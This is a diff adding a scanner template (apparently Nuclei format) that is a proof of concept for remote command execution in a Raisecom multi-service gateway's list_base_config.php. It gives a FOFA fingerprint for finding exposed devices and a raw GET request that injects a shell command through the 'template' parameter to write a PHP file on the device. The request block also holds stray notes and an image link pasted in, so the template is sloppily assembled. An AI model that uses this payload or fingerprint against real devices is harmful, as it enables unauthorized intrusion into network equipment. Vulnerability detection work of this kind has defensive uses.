@@ -1,0 +1,37 @@
+id: poc-zgimeowqvhyn6e7f
+info:
+  name: 瑞斯康达-多业务智能网关 list_base_config.php 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zgimeowqvhyn6e7f'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zgimeowqvhyn6e7f
+    fofa: body="/images/raisecom/back.gif" && title=="Web user login"
+http:
+- raw:
+  - 'GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+    /tmp/test.php
+
+    请求后验证漏洞
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1723974167796-791a5e9c-16ac-4ccb-b463-835eecdc4c46.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
